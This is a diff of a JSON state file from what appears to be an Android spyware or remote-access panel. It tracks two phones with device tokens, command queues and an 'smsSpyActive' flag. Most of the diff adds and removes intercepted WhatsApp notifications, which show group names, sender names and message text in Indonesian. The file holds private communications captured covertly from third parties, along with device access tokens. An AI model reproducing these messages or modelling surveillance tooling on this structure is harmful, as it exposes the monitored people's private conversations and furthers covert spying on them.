@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775048461945,
+    "lastSeen": 1775048466114,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14466 pesan dari 10 chat",
+        "time": "01/04 21:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048468779
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13935 pesan): ~ syafa karamoy",
+        "content": "MUACHHH",
+        "time": "01/04 21:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048468760
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13934 pesan): ~ 🕷️",
+        "content": "💟 Stiker",
+        "time": "01/04 21:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048465622
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎APK BUG BY ZYRXX (4 pesan): ~ :)",
@@ -3995,30 +4019,6 @@
         "time": "01/04 20:36",
         "pkg": "com.whatsapp",
         "receivedAt": 1775047008497
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (99 pesan): ~ Dark Chocolate 🍫👅",
-        "content": "-1",
-        "time": "01/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775047008393
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15962 pesan dari 11 chat",
-        "time": "01/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775047001191
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13784 pesan): ~ Bot",
-        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
-        "time": "01/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775047000844
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775048462599,
+    "lastSeen": 1775048467031,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13935 pesan): ~ syafa karamoy",
+        "content": "MUACHHH",
+        "time": "01/04 21:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048468674
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13934 pesan): ~ 🕷️",
+        "content": "💟 Stiker",
+        "time": "01/04 21:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048465597
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎APK BUG BY ZYRXX (4 pesan): ~ :)",
@@ -8048,22 +8064,6 @@
         "time": "01/04 20:36",
         "pkg": "com.whatsapp",
         "receivedAt": 1775047008464
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (99 pesan): ~ Dark Chocolate 🍫👅",
-        "content": "-1",
-        "time": "01/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775047008362
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13784 pesan): ~ Bot",
-        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
-        "time": "01/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775047001286
       }
     ],
     "galleryPhotos": [],
